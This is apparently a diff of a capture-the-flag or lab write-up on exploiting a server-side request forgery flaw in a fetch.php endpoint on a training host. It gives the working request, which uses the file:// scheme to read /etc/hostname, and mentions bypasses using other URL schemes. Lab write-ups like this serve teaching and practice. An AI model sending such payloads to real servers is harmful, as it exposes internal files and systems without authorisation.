@@ -7,14 +7,19 @@ Exploit a Server-Side Request Forgery vulnerability to read internal system file
 ## 🔍 Vulnerability Analysis
 
 - **Type:** Server-Side Request Forgery (SSRF)
+
 - **Endpoint:** `GET /fetch.php`
+
 - **Parameter:** `url`
+
 - **Detection:** URL parameter passed directly to file retrieval function without protocol validation
+
 - **Impact:** Internal file disclosure and service enumeration
 
 ## 💥 Exploitation
 
 ```http
+
 GET /fetch.php?url=file:///etc/hostname HTTP/1.1
 Host: improved-wolfpack.apac01.hackviser.space
 Result: Successfully extracted server hostname through file protocol SSRF, revealing internal system information.
@@ -40,4 +45,5 @@ Bypass Techniques: Leveraging different URL schemes for SSRF exploitation
 ## Notes
 
 Conducted in a controlled environment for educational purposes.
+
 ```
